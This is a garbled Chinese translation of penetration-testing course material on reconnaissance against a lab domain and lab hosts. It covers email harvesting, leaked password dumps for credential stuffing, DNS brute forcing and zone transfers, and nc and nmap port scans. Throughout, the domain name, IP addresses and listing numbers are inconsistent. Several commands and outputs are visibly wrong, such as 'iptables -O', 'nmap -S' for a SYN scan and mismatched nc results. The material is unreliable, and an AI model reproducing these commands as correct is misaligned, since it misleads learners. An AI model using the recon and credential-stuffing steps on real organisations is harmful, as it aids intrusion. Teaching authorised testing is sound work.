+ns1.megacorp.com:38.100.193.70
+ns2.megacorp.com:38.100.193.80
+megacorp.com:empty
+www.megacorp.com:38.100.193.76
+www2.megacorp.com:38.100.193.79
+```
+
+# 攻击性安全
+
+www.offensecurity.com
+
+
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+# 列表 209 - 在 megacorpone.com 上运行 theHarvester
+
+我们发现了一些电子邮件地址，其中 `first@megacorpone.com` 似乎对我们来说是新的。我们还发现了 `megacorpone.com` 的一些子域名。让我们也把这些添加到我们的笔记中。
+
+这很好地提醒了我们，信息收集并不总是一个线性的过程。我们可能在寻找用户信息时，发现了关于我们目标的其他信息。这就是为什么保持良好的记录非常重要。
+
+## 6.12.1.1 练习题
+
+- 1. 使用 `theHarvester` 枚举 `megacorpone.com` 的电子邮件地址。
+- 2. 尝试不同的数据源 (`-b`)。哪一个对你最有效？
+
+## 6.12.2 密码破解库 (Password Dumps)
+
+恶意黑客经常会在 Pastebin 或声誉较低的网站上发布泄露的凭据¹⁷⁹ 这些密码破解库对于生成字典具有极高的价值。例如，Kali Linux 包含了从 2009 年数据泄露中生成的 `rockyou` 字典¹⁷⁹。
+
+将我们在用户枚举期间发现的电子邮件地址与密码破解库进行比对，可以发现我们可以用于撞库攻击（credential stuffing attacks）的密码。
+
+## 6.13 社交媒体工具
+
+几乎所有组织在社交媒体上都有某种形式的存在¹⁸⁰ 公司发布的信息对我们来说非常有用。例如，我们可以利用这些信息来识别潜在员工，并获取更多关于公司及其运营的信息。有多种方法可以使用我们已经讨论过的工具（如 `recon-ng` 和 `theHarvester`）来收集这些公共信息。让我们再探索一些额外的工具。
+
+### 6.13.1.1 Social-Searcher
+
+`Social-Searcher`¹⁸¹ 是一个针对社交媒体网站的搜索引擎。免费账户每天允许有限次数搜索。`Social-Searcher` 可以作为在多个专业平台上设置 API 密钥的快速替代方案。
+
+> ¹⁷⁹ (Troy Hunt, 2019), https://haveibeenpwned/PwedWebsites
+> ¹⁸⁰ (Wikipedia, 2019), https://en.wikipedia.org/wiki/RockYou#Data_breach
+> ¹⁸⁰ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Social_Media
+> ¹⁸¹ (Social-Searcher, 2019), https://www.social-searcher.com
+
+使用 Kali Linux 2.0 进行渗透测试
+
+搜索结果将包含目标组织发布的信息以及人们对它的评价。除此，这可以帮助确定组织在社交媒体上的足迹和覆盖范围。一旦完成这一步，我们可能会选择使用针对特定站点工具。
+
+## 6.13.2 针对特定站点的工具
+
+有两个想要熟悉的特定工具。`Twofi`¹⁸² 扫描用户的 Twitter 馈，并为针对该用户的密码攻击生成个性化字典。我们在被动信息收集期间不会运行任何攻击，但可以在需要时使用我们已识别的任何 Twitter 账户运行它以获取字典。`Twofi` 需要 Twitter API 密钥。
+
+`linked2username`¹⁸³ 是一个基于 LinkedIn 数据生成用户名列表的脚本。它需要有效的 LinkedIn 凭据，并取决于与目标组织内个人的 LinkedIn 连接。该脚本将以几种不同的格式输出用户名。
+
+### 6.13.2.1 练习题
+
+- 1. 使用之前讨论过的任何社交媒体工具识别额外的 MegaCorp Corp 员工。
+
+> ¹⁸² (Robin Wood, 2019), https://digi.ninja/projects/twofi.php
+> ¹⁸³ (initstring, 2019), https://github.com/initstring/linked2username
+
+## 6.14 Stack Overflow
+
+`Stack Overflow`¹⁸⁴ 是一个开发者提问和回答代码相关问题的网站。
+
+从信息收集的角度来看，该网站的价值在于观察特定用户提问或回答的问题类型。如果我们合理判断 Stack Overflow 上的某个用户也是我们目标组织的员工，我们可能根据该员工的提问答推断出关于组织的一些信息。
+
+例如，如果我们发现一个用户总是提问和回答关于 Python 的问题，假设他们每天都使用这种编程语言是合理的，而且这种语言可能用于他们所在的组织。
+
+更糟糕的是，如果我们在这类论坛上发现员工讨论漏洞修复等敏感信息，我们可能会在此阶段发现未修补的漏洞。
+
+## 6.15 信息收集框架
+
+我们将通过要介绍两个额外的工具来结束本模块，这些工具整合了我们讨论过的许多技术并添加了额外功能。这些工具对于我们在实验室的工作来说通常太重了，但在现实评估中非常有价值。
+
+## 6.15.1 OSINT 框架
+
+`OSINT Framework`¹⁸⁵ 在一个中心位置整合了信息收集工具和网站。框架中列出的某些工具涵盖的领域超过了信息安全。
+
+## 7.1.1 与 DNS 服务器交互
+
+每个域名可以使用不同类型的 DNS 记录。最常见的 DNS 记录类型包括：
+
+- `NS` - 名称服务器记录，包含托管该域名 DNS 记录的权威托管服务器的名称。
+- `A` - 也称为主机记录，该“记录”包含主机名（如 `www.megacorporome.com`）的 IP 地址。
+- `MX` - 邮件交换记录（Mail Exchange），包含负责该域名电子邮件的服务器名称。一个域名可以包含多个 MX 记录。
+- `PTR` - 指针记录（Pointer Records），用于反向查找区域，用于查找与 IP 地址相关的记录。
+- `CNAME` - 规范名称记录（Canonical Name Records），用于为其他主机记录创建别名。
+- `TXT` - 文本记录，包含任何任意数据，可用于各种用途，例如域名所有权验证。
+
+由于 DNS 中包含了极其丰富的信息，它通常是主动信息收集的获利目标。
+
+为了演示这一点，我们将使用 `host` 命令来查找 `www.megacorporome.com` 的 IP 地址。
+
+```
+kali@kali:~# host www.megacorporome.com
+www.megacorporome.com has address 38.100.193.76
+```
+
+> 列表 210 - 使用 host 查找 www.megacorporome.com 的 A 记录
+
+默认情况下，`host` 命令查找 A 记录，但我们也可以查询其他字段，例如 MX 或 TXT 记录。要此操作，使用 `-t` 选项来指定我们要查找的记录类型：
+
+```
+kali@kali:~# host -t mx megacorporome.com
+megacorporome.com mail is handled by 10 fb.gandi.net.
+megacorporome.com mail is handled by 50 mail.megacorporome.com.
+megacorporome.com mail is handled by 60 mail.megacorporome.com.
+megacorporome.com mail is handled by 20 spool.mail.gandi.net.
+```
+
+> 列表 211 - 使用 host 查找 megacorporome.com 的 MX 和 TXT 记录
+
+## 7.1.2 自动化查找
+
+现在我们已经获取了 `megacorporome.com` 域的一些初始数据，可以继续使用额外的 DNS 查询来发现属于同一域名的更多主机名和 IP 地址。例如，我们知道该域名有一个 Web 服务器，主机名为 `www.megacorporome.com`。
+
+让我们对这个主机名运行 `host` 命令：
+
+```
+kali@kali:~# host www megacororpome.com
+www.megacororpome.com has address 38.108.193.76
+```
+
+> 列表 212 - 使用 host 查找一个有效的主机
+
+现在，让我们看看 `megacorpome.com` 是否有一个主机名为 `idonextist` 的服务器。注意这两个查询之间的区别吗？
+
+```
+kali@kali:~# host idonextist.com
+Host idonextist.com not found: 3(NXDOMAIN)
+```
+
+> 列表 213 - 使用 host 查找无效的主机
+
+在列表 212 中，我们查询了一个有效的主机并收到了 IP 响应。相比之下，列表 213 返回了错误 (`NXDOMAIN`)，表示该主机名不存在公共 DNS 记录。现在我们已经了解了如何搜索有效的主机，可以自动化我们的工作了。
+
+## 7.1.3 暴力破解查找
+
+
+
+暴力破解是一种通过尝试错误来寻找有效信息的技术，包括 Web 服务器上的目录、用户名和密码组合，或者在本例中是有效的 DNS 记录。通过使用包含常用主机名的字典列表，我们可以尝试猜测 DNS 记录并检查响应以获取有效的主机名。
+
+在之前的示例中，我们进行的是正向查找，即请求主机名的 IP 地址，并查询了有效和无效的主机。我们可以在 Bash 命令行中使用 `host` 命令自动化常用主机名的正向 DNS 查找。
+
+首先，构建一个可能的主机列表：
+
+```
+kali@kali:-$ cat list.txt
+www
+ftp
+mail
+owa
+proxy
+router
+```
+
+> 列表 214 - 一个可能的主机的小列表
+
+接下来，我们使用 Bash 命令行解析每个主机名：
+
+```
+kali@kali:-$ for ip in $(cat list.txt); do host $ip.megacorpome.com; done
+.megacorpome.com has address 38.108.193.76
+Host megacorpome.com not found: 3(NXDOMAIN)
+mail.megacorpome.com has address 38.108.193.84
+owa.megacorpome.com not found: 3(NXDOMAIN)
+Host proxy.megacorpome.com not found: 3(NXDOMAIN)
+router.megacorpome.com has address 38.108.193.71
+```
+
+> 列表 215 - 使用暴力破解进行 DNS 查找
+
+通过这种简单的方法，我们发现了 'www'、'mail' 和 'router' 的条目。主机 'ftp'、'owa' 和 'proxy' 未被找到。更全面的字典列表可以通过 Seclists 项目获取。这些字典可以安装到 `/usr/share/seclists` 目录。
+
+## 7.1.4 反向查找暴力破解
+
+我们的 DNS 暴力破解枚举揭示了 `38.100.x` 范围内的 IP 地址。如果 `megacorpome.com` 配置了 PTR 记录，我们就可以通过反向查找获取该范围的主机名。现在我们使用循环和 `grep` 来过滤掉无效的结果：
+
+```
+kali@kali:~$ for ip in $(seq 50 100); do host $ip.38.100.in.arpa; done | grep -v "found"
+69.100.in.arpa pointer beta.megacorp.com.
+70.100.in.arpa pointer mail.megacorp.com.
+71.100.in.arpa pointer admin.megacorp.com.
+72.100.in.arpa pointer mail2.megacorp.com.
+73.100.in.arpa pointer megacorp.com.
+74.100.in.arpa pointer www.megacorp.com.
+75.100.in.arpa pointer vpn.megacorp.com.
+```
+
+> 列表 216 - 使用暴力破解进行反向查找
+
+我们通过反向查找成功解析了一组 IP 地址。如果 `megacorpome.com` 配置了 MX 记录，我们就可以扫描这些 IP。
+
+## 7.1.5 DNS 区域传输
+
+区域传输（Zone Transfer）基本上是将 DNS 从主服务器复制到从服务器。区域传输应该只允许授权的 DNS 服务器进行，但在许多情况下，它们可能被配置错误，允许任何人进行查询。执行区域传输的语法如下：
+
+```
+host -l <domain>
+```
+
+> 列表 217 - 使用 host 执行 DNS 区域传输
+
+从我们的列表 210 中，我们注意到 `megacorpome.com` 有三个 DNS 服务器：`ns1`、`ns2` 和 `ns3`。让我们尝试对每一个进行区域传输：
+
+```
+kali@kali~~$ host -l megacorpome.com ns1.megacorpome.com
+Using domain server:
+Name: ns1.megacorpome.com
+Address: 38.100.193.70#53
+Aliases:
+Host megacorpome.com not found: 5(REFUSED)
+Transfer failed.
+```
+
+> 列表 218 - 尝试失败
+
+不幸的是，第一个 DNS 服务器 `ns1` 不允许 DNS 区域传输，因此我们的尝试失败了。让我们使用第二个 DNS 服务器 `ns2` 尝试相同的步骤：
+
+```
+kali@kali~~$ host -l megacorpome.com ns2.megacorpome.com
+Using domain server:
+Name: ns2.megacorpome.com
+Address: 38.100.193.80#53
+Aliases:
+megacorpome.com has name server ns1.megacorpome.com,
+megacorpome.com has name server ns2.megacorpome.com,
+megacorpome.com has name server ns3.megacorpome.com,
+admin.megacorpome.com has address 38.100.193.83
+beta.megacorpome.com has address 38.100.193.88
+fs1.megacorpome.com has address 38.100.193.82
+innet.megacorpome.com has address 38.100.193.87
+mail.megacorpome.com has address 38.100.193.84
+mail2.megacorpome.com has address 38.100.193.73
+ns1.megacorpome.com has address 38.100.193.78
+```
+
+> 列表 219 - 使用 host 演示 DNS 区域传输
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+此服务器允许区域传输（zone transfers），并提供了 `megacorp.com` 域名的区域文件完整导出，提供了一份 IP 地址及其对应 DNS 主机名的便捷列表！
+
+`megacorp.com` 域名有少数几个 DNS 服务器需要检查。然而，较大的组织会托管许多 DNS 服务器，或者我们可能想要对给定域名内的所有 DNS 服务器尝试区域传输请求。`Bash` 脚本可以帮助实现此点。
+
+要使用 `host` 命令尝试区域传输，我们需要两个参数：名称服务器地址和域名。我们可以通过以下命令获取特定域名的名称服务器：
+
+```
+kali@~$ host - ns megacorp.com | cut -d " " -f 4
+ns1.megacorp.com.
+ns2.megacorp.com.
+ns3.megacorp.com.
+```
+
+| 列表 220 - 使用 host 获取特定域名的 DNS 服务器 |
+
+更进一步，我们可以编写一个 `Bash` 脚本来自动化识别相关的名称服务器的过程，并对每个名称服务器尝试区域传输：
+
+```bash
+#!/bin/bash
+
+# 简单的区域传输 Bash 脚本
+# $1 是在 bash 脚本后的第一个参数
+# 检查是否提供了参数，如果没有，则打印用法
+
+if [ -z "$1" ]; then
+  echo "[+] 简单的区域传输脚本"
+  echo "[+] 用法      : $0 <域名>"
+  exit 0
+fi
+
+# 如果提供了参数，识别该域名的 DNS 服务器
+
+for server in $(host -t ns megacorp.com | cut -d " " -f4); do
+  # 对这些服务器中的每一个尝试区域传输
+  host -l $server | grep "has address"
+done
+```
+
+| 列表 221 - 我们的 Bash DNS 区域传输脚本 |
+
+让我们让脚本变得可执行并针对 `megacorp.com` 运行它。
+
+
+
+```
+kali@~$ ./dns-axfr.sh megacorp.com
+admin.megacorp.com has address 38.100.193.88
+beta.megacorp.com has address 38.100.193.88
+sf1.megacorp.com has address 38.100.193.62
+intranet.megacorp.com has address 38.100.193.87
+mail.megacorp.com has address 38.100.193.94
+mail2.megacorp.com has address 38.100.193.73
+ns1.megacorp.com has address 38.100.193.70
+ns2.megacorp.com has address 38.100.193.80
+ns3.megacorp.com has address 38.100.193.90
+```
+
+## 7.1.6 Kali Linux 中的相关工具
+
+Kali Linux 中有几种工具可以自动化 DNS 举。两个显著的例子是 `DNSRecon` 和 `DNSenum`，它们具有实用的选项，我们将在接下来的章节中探索它们。
+
+### 7.1.6.1 DNSRecon
+
+`DNSRecon` 是一个用 Python 编写的高级、现代的 DNS 枚举脚本。针对 `megacorporome.com` 运行 `dnsrecon`，使用 `-d` 选项指定域名，并使用 `-t` 指定要执行的枚举类型（在本例中为区域传输），产生如下输出：
+
+```
+kali@kali:~$ dnsrecon -d megacorporome.com -t axfr
+[*] 正在测试 NS 服务器区域传输
+[*] 正在检查 megacorporome.com 名称服务器的区域传输
+[+] 解析 SOA 记录
+[+] ns1.megacorporome.com 38.100.193.70
+[+] 解析 NS 记录
+[+] 找到 NS 服务器:
+    * ns1.megacorporome.com 38.100.193.70
+    * ns2.megacorporome.com 38.100.193.80
+    * ns3.megacorporome.com 38.100.193.90
+[*] 正在移除重复的 NS 服务器 IP 地址...
+
+[*] 正在尝试 NS 服务器 38.100.193.80
+38.100.193.80 端口 53 TCP 开启
+[+] 区域传输成功！
+    * ns1.megacorporome.com 38.100.193.70
+    * ns2.megacorporome.com 38.100.193.80
+    * ns3.megacorporome.com 38.100.193.90
+    * @mx.mail.gandi.net 217.70.178.215
+    * @mx.mail.gandi.net 217.70.178.217
+    * @mx.mail.gandi.net 217.70.178.216
+    * @mx.mail.gandi.net 217.70.178.181
+    * admin.megacorporome.com 38.100.193.83
+    * fsl1.megacorporome.com 38.100.193.82
+    * www.megacorporome.com 38.100.193.79
+    * test.megacorporome.com 38.100.193.67
+    * www2.megacorporome.com 38.100.193.76
+    * mail.megacorporome.com 38.100.193.84
+    * ns1.megacorporome.com 38.100.193.70
+    * ns2.megacorporome.com 38.100.193.80
+    * ns3.megacorporome.com 38.100.193.90
+[*] 尝试 NS 服务器 38.100.193.70
+38.100.193.70 端口 53 TCP 开启
+[-] 区域传输失败！
+[-] qname 无响应
+```
+
+根据上述输出，我们已经成功地对 `megacorp.com` 执行了区域传输。结果基本上是该域名的区域文件完整导出。让我们使用我们创建的 `list.txt` 尝试破解主机。该列表如下：
+
+```
+kali@~$ cat list.txt
+www
+ftp
+router
+```
+
+要开始破解，我们将使用 `-d` 选项指定域名，`-D` 指定包含潜在子域名的文件，并使用 `-t` 指定要执行的枚举类型（在本例中为 a）：
+
+```
+kali@~$ dnsrecon -d megacorp.com -D list.txt -t a
+[+] 对 megacorp.com 执行主机破解
+[+] A router.megacorp.com 38.100.193.71
+[+] A www.megacorp.com 38.100.193.76
+[+] A mail.megacorp.com 38.100.193.84
+[+] 找到记录
+```
+
+列表 223 - 使用 `dnsrecon` 执行区域传输
+
+我们的破解已经完成，并成功解析了几个主机。
+
+### 7.1.6.2 DNSenum
+
+`DNSenum` 是另一个流行的 DNS 枚举工具。为了显示不同的输出，让我们针对 `zonetransfer.me` 域名（该域名由 DigiNinja 所有）运行 `dnsenum`，该域名特别允许区域传输：
+
+```
+kali@~$ dnsenum zonetransfer.me
+dnsenum.pl VERSION:1.2.2
+--------------------
+主机地址:
+
+```
+
+zonetransfer.me        7200      IN      A       217.147.180.162
+
+```
+
+列表 224 - 用于 `dnsrecon` 破解子名的列表
+
+列表 225 - 使用 `dnsrecon` 破解主机
+
+列表 226 - 使用 `dnsenum` 执行区域传输
+
+这些枚举工具既强大又简单。在继续之前，请花时间练习每一个工具。
+
+### 7.1.6.3 练习
+
+1. 查找 `megacorp.com` 域名的 DNS 服务器。
+2. 使用高级脚本语言（如 Python、Perl 或 Ruby）编写小型脚本尝试对 `megacorp.com` 执行区域传输。
+3. 重现上面的示例，并使用 `dnsrecon` 尝试对 `megacorp.com` 执行区域传输。
+
+## 7.2 端口扫描
+
+端口扫描是检查远程机器上的 TCP 或 UDP 端口的过程，旨在检测目标上运行着哪些服务以及可能存在哪些攻击向量。
+
+> 请注意，端口扫描并不代表传统的用户活动，在某些司法管辖区可能被视为非法行为。因此，在没有目标网络所有者直接书面许可的情况下，不应在实验室之外进行此类操作。
+
+理解端口扫描的影响以及特定端口扫描可能产生的影响至关重要。由于某些扫描会产生大量流量，加之其侵入性，盲目运行端口扫描可能会对系统或客户端网络产生不利影响，例如导致服务器和网络链路过载或触发入侵检测系统（IDS）。运行错误的扫描可能会导致客户停机。
+
+使用适当的扫描方法可以显著提高我们渗透测试人员的效率，同时限制许多风险。根据参与程度以及对目标进行全端口扫描的意图，我们可以从扫描 80 和 443 端口开始。根据可能的 Web 服务器列表，我们可以在执行其他枚举工作的同时，在后台对这些服务器运行全端口扫描。一旦全端口扫描完成，我们可以进一步缩小扫描范围，为后续每次扫描探测更多信息。端口扫描应被视为一个针对每个任务都是独特的动态过程。一次扫描的结果决定了后续扫描的类型和范围。
+
+### 7.2.1 TCP / UDP 扫描
+
+我们将使用 `Netcat` 从简单的 TCP 和 UDP 开始端口扫描的探索。需要注意的是，`Netcat` 并不是端口扫描器，但可以以原始的方式使用。由于它已经存在于许多系统中，当我们不需要功能全的端口扫描器时，可以重用其功能来模拟基本的端口扫描。然而，有许多更好的工具可以检测端口扫描，我们将在稍后详细介绍。
+
+### 7.2.1.1 TCP 扫描
+
+最简单的端口扫描技术通常称为连接扫描（CONNECT scanning），它依赖于三次握手¹⁹⁵ 机制。该机制的设计使得两个尝试通信的主机在传输任何数据之前，先协商网络套接连接的参数。简单来说，主机向目标目标端口的服务器发送一个 TCP SYN 数据包。如果目标端口开放的，服务器将响应一个 SYN-ACK 数据包，客户端发送一个 ACK 数据包以完成握手。
+
+如果握手成功完成，则该端口被认为是开放的。
+
+¹⁹⁵ (Microsoft, 2010), http://support.microsoft.com/kb/172983
+
+为了说明这一点，我们将对端口 3389-3390 运行 TCP Netcat 扫描。`-w` 选项指定连接超时，`-z` 用于指定零 I/O 模式，它将不发送数据并用于扫描：
+
+
+
+`kali@kali:~$ nc -nv -w 1 -z 10.11.1.228 3389-3390`
+
+(UNKNOWN) [10.11.1.220] 3390 (?) Connection refused
+
+(UNKNOWN) [10.11.1.220] 3388 :) open
+
+(UNKNOWN) [10.11.1.220] 3388 (?) Connection refused
+
+sent 0, rcvd 0
+
+```
+```
+
+### 列表 227 - 使用 nc 执行 TCP 端口扫描
+
+基于此结果，我们可以看到端口 `3389` 是开放的，而端口 `3388` 和 `3390` 的连接失败了。截图显示了 Wireshark 捕获的内容：
+
+| No. | Time | Source | Destination | Protocol | Length info |
+|---|---|---|---|---|---|
+| 1 | 0.000000000 | 10.11.1.228 | 10.11.1.229 | TCP | 74472 - 3390 [SYN] Seq=0 Win=6420 |
+| 4 | 0.017365715 | 10.11.1.228 | 10.11.1.229 | TCP | 63390 - 54272 [RST, Ack] Seq=0 Ack=1 |
+| 5 | 0.019993065 | 10.11.1.228 | 10.11.1.229 | TCP | 74259 - 33892 [SYN] Seq=0 Win=6420 |
+| 6 | 0.025793945 | 10.11.1.228 | 10.11.1.229 | TCP | 74389 - 45692 [SYN] Seq=0 Ack=1 W |
+| 7 | 0.027584392 | 10.11.1.228 | 10.11.1.229 | TCP | 664562 - 3389 [Ack] Seq=1 W= |
+| 8 | 0.028486541 | 10.11.1.228 | 10.11.1.229 | TCP | 74332 - 3390 [SYN] Seq=0 Win=6420 |
+| 9 | 0.03111114 | 10.11.1.228 | 10.11.1.229 | TCP | 66399 - 45692 [Ack] Seq=1 Ack=2 |
+| 10 | 0.03417093 | 10.11.1.228 | 10.11.1.229 | TCP | 66399 - 3389 [ACK] Seq=1 Ack=1 |
+| 11 | 0.034885725 | 10.11.1.228 | 10.11.1.229 | TCP | 66399 - 45692 [Ack] Seq=1 W= |
+| 12 | 0.035885725 | 10.11.1.228 | 10.11.1.229 | TCP | 63889 - 45692 [RST, Ack] Seq=1 |
+
+图 42: netcat 扫描的 Wireshark 捕获
+
+在此捕获（图 42）中，Netcat 向端口 `3390`、`3389` 和 `3388` 发送了 SYN 包（第 1、5、9 行）。由于多种因素（包括计时），数据包在 Wireshark 中是乱序的。注意服务器在第 6 行从端口 `3389` 发送 SYN-ACK 包，表明该端口已开放。其他端口没有回复 SYN-ACK 包，因此我们可以推它们未开放。最后，在第 8 行，Netcat 通过发送 FIN-ACK 包关闭了连接。
+
+### 7.2.1.2 UDP 扫描
+
+由于 UDP 不涉及三次握手，端口扫描的机制与 TCP 不同。让我们对另一个目标 `160-162` 运行 UDP Netcat 扫描。这是使用我们尚未看到的 `nc` 选项 `-u` 完成的，它表示 UDP 扫描：
+
+```
+kali@kali:~$ nc -nv -u -z 10.11.1.115 160-162
+
+(UNKNOWN) [10.11.1.115] 161 (snmp) open
+```
+
+列表 228 - 使用 nc 执行 UDP 端口扫描
+
+从 Wireshark 捕获中，我们可以看到 UDP 扫描使用的机制与 TCP 扫描不同：
+
+| No. | Time | Source | Destination | Protocol | Length Info |
+|---|---|---|---|---|---|
+| 4 | 10:03:07.483 | 10.11.1.126 | 10.11.1.115 | UDP | 43866 - 162 Len=1 |
+| 5 | 10:03:09.283 | 10.11.1.126 | 10.11.1.115 | ICMP | 71 destination unreachable (Port un) |
+| 6 | 10:03:09.684 | 10.11.1.126 | 10.11.1.115 | UDP | 43182 - 161 Len=1 |
+| 7 | 10:03:10.704 | 10.11.1.126 | 10.11.1.115 | UDP | 43182 - 160 Len=1 |
+| 8 | 10:03:11.853 | 10.11.1.126 | 10.11.1.115 | ICMP | 71 destination unreachable (Port un) |
+
+如图 43 所示，任何 UDP 包都会发送到特定端口（数据包 3、5、6 和 7）。如果目标端口是开放的，数据包将传递到应用层，收到的响应将取决于应用程序如何编写响应。在这个示例中，应用程序没有响应。如果 UDP 端口关闭的，目标应该发送 ICMP 端口不可达（如数据包 4 和 8 所示），由目标机器的 UDP/IP 栈发送。
+
+大多数 UDP 扫描器使用标准的“ICMP 端口不可达”消息来推断目标端口的状态。然而，当目标端口被防火过滤时，这种方法可能完全不可靠。在这种情况下，扫描器由于缺少 ICMP 消息而报告目标端口为开放。
+
+### 7.2.1.3 常见的端口扫描陷阱
+
+UDP 扫描可能由于几个原因出现问题。首先，UDP 扫描通常不可靠，防火墙和路由器可能会丢弃 ICMP 包。这可能导致误报，并显示端口为开放。其次，大多数端口扫描器不会扫描所有可用端口，通常有一个预设的“感兴趣端口”列表。许多开放的 UDP 端口可能会被忽略。结果是渗透测试人员经常忘记扫描开放的 UDP 端口，而是专注于“更有趣”的 TCP 端口。虽然 UDP 扫描可能不可靠，但有很多连接开放 UDP 端口的攻击向量。
+
+### 7.2.2 使用 Nmap 进行端口扫描
+
+`Nmap`¹¹⁹⁶（由 Gordon Lyon，又名 Fyodor96 编写）是最流行、通用且健壮的端口扫描器之一。它已活跃开发了十多年，并具有端口扫描之外的功能。
+
+> 我们在本模块中涵盖的一些 Nmap 示例扫描是使用 `sudo` 运行的。这是由于少数 Nmap 扫描选项需要访问原始套接字¹⁹⁷，我们需要 root 权限。原始套接字允许对 TCP 和 UDP 数据包进行精细操作。如果没有访问原始套接字，
+
+# 攻击性安全
+
+Nmap 的局限性在于它会回退到使用标准的 Berkeley socket API 来构造数据包。<sup>198</sup>
+
+让我们探索一些扫描示例，以更好地了解 Nmap 及其选项。
+
+### 7.2.2.1 流量的溯源
+
+默认的 Nmap TCP 扫描会扫描机器上流行的 1000 个端口。在开始运行扫描之前，我们先估算此类扫描产生的流量。我们将在使用 `iptables` 监控目标主机流量的同时，对一台实验机器进行扫描。<sup>199</sup>
+
+我们将使用 `iptables` 选项。首先，我们使用 `-I` 选项向给定的链插入新规则，这包括在 `INPUT`（入站）和 `OUTPUT`（出站）链的相应位置插入该规则。我们将使用 `-s` 指定源 IP 地址，并使用 `-j ACCEPT` 接受流量。最后，我们将使用 `-Z` 选项将所有链中的数据包和字节计数器清零。
+
+现在运行这些命令：
+
+```
+kali@:- sudo iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPT
+
+kali@:- sudo iptables -O OUTPUT 1 -d 10.11.1.220 -j ACCEPT
+
+kali@:- sudo iptables -Z
+```
+
+> 219 - 为扫描配置我们的 iptables 规则
+
+现在让我们使用 `nmap` 生成一些流量：
+
+```
+kali@:- nmap 10.11.1.220
+
+Starting: Nmap 7.70 ( https://nmap.org ) on 2019-03-04 11:20 EST
+
+Nmap scan report for 10.11.1.220
+
+Host is up (0.29s latency).
+
+Not shown: 980 closed ports
+
+PORT STATE SERVICE
+
+21/tcp open ftp
+
+53/tcp open domain
+
+68/tcp open kerberos-sec
+
+135/tcp open msrpc
+
+139/tcp open netbios-ssn
+```
+
+
+
+389/tcp open ldap
+
+443/tcp open ldap
+
+445/tcp open microsoft-ds
+
+464/tcp open kissd
+
+593/tcp open http-rpc-epmap
+
+636/tcp open ldaps
+
+3268/tcp open globalLDAP
+
+3269/tcp open globalLDAPS
+
+3389/tcp open ms-wt-server
+
+<sup>198</sup>(Wikipedia, 2019), https://en.wikipedia.org/wiki/Berkeley_sockets#API_functions
+<sup>199</sup>(netfilter, 2014), http://netfilter.org/projects/iptables/index.html
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+...
+nmap done: 1 IP address (1 host) scanned in 46.29 seconds
+
+列表 230 - 扫描 1000 个最流行的 TCP 端口 ip
+
+扫描完成并显示了几个开放端口。
+
+现在让我们看一些 `iptables` 统计数据，以了解我们的扫描产生了多少流量。我们将使用 `-v` 选项增加输出的详细程度，`-n` 启用数字输出，以及 `-L` 列出所有链中存在的规则：
+
+```
+kal@kali:~$ sudo iptables -vn
+Chain Input (policy ACCEPT 1528 packets, 226K bytes)
+pkts bytes target prot in out destination
+1263 51264 ACCEPT all * * 10.11.1.220 0.0.0/0
+```
+
+```
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+pkts bytes target prot in out destination
+                 all * * 0.0.0/0 10.11.1.220
+```
+
+```
+Chain OUTPUT (policy ACCEPT 1323 packets, 191K bytes)
+pkts bytes target prot in out destination
+1314 78380 ACCEPT all * * 0.0.0/0 10.11.1.220
+```
+
+列表 231 - 使用 `iptables` 监控 1000 端口扫描的 `nmap` 流量
+
+根据输出，默认的1000端口扫描产生了 78 KB 的流量。
+
+让我们使用 `iptables -Z` 将所有链的数据包和字节计数器清零，并使用另一个 `nmap` 扫描 `-p` 指定所有端口：
+
+```
+kal@kali:~$ sudo iptables -Z
+kal@kali:~$ nmap -p 1-65535 10.11.1.220
+Starting Nmap 7.70 (https://nmap.org) at 2019-03-04 14:27 CET
+nmap scan report for 10.11.1.220
+Host is up (0.0067s)
+Not shown: 65507 ports
+PORT STATE SERVICE
+21/tcp open ftp
+53/tcp open domain
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kissd
+593/tcp open http-rpc-epmap
+636/tcp open ldaps
+3268/tcp open globalLDAP
+3269/tcp open globalLDAPS
+3389/tcp open ms-wt-server
+5722/tcp open msdfs
+9389/tcp open adws
+12777/tcp filtered
+46056/tcp filtered
+```
+
+nmap scan: 1 IP address (1 host) scanned in 80.42 seconds
+
+列表 232 - 使用 `iptables` 监控所有端口 `nmap` 扫描流量
+
+```
+kali@kali:~ sudo iptables -vn -L
+Chain Input (policy ACCEPT 219K packets, 252M bytes)
+pkts bytes target prot in out destination
+66243 2659K ACCEPT all * * 10.11.1.220 0.0.0/0
+Chain FORWARD (policy ACCEPT 0 bytes)
+pkts bytes target prot in out destination
+Chain OUTPUT (policy ACCEPT 8592 packets, 11M bytes)
+pkts bytes target prot in out destination
+66768 4006K ACCEPT all * * 0.0.0/0 10.11.1.220
+```
+
+显式探测所有 65535 个端口的类似扫描产生了 4 MB 的流量，数量明显更高。上面的结果意味着对 C 类网络（254 台主机）进行全 `nmap` 扫描将向网络发送超过1000 MB 的流量。在理想情况下，对每个目标进行全 TCP 扫描将提供关于暴露服务的准确信息。然而，示例显示需要平衡流量与发现端口的需求。这对于较大的 A 或 B 类网络特别有用。在下一节中，我们将探索 Nmap 的各种技术。
+
+## 7.2.2 SYN 扫描
+
+Nmap 首选扫描技术是 SYN 或“隐蔽”扫描。使用 SYN 扫描有很多优点，因为它是 `nmap` 命令未指定技术且用户具有 root 权限时的默认技术。SYN 是一种端口扫描方法，涉及向目标的各个端口发送 SYN 数据包而不完成 TCP 握手。如果 TCP 端口是开放的，目标将返回 SYN-ACK，告诉我们端口是开放的。此时，扫描器不发送最后的 ACK。
+
+```
+kali@kali:~ sudo nmap -S 10.11.1.220
+Starting Nmap 7.70 ( https://nmap.org ) on 2019-03-04 11:27 EST
+nmap scan report for 10.11.1.220
+Host is up (1.3s latency).
+Not shown: 980 closed ports
+PORT    STATE
+21/tcp  open ftp
+53/tcp  open domain
+88/tcp  open kerberos-sec
+135/tcp  open msrpc
+139/tcp  open netbios-ssn
+389/tcp  open ldap
+445/tcp  open microsoft-ds
+464/tcp  open passwd
+```
+
+> 233 - 使用 `nmap` 执行 SYN 扫描
+
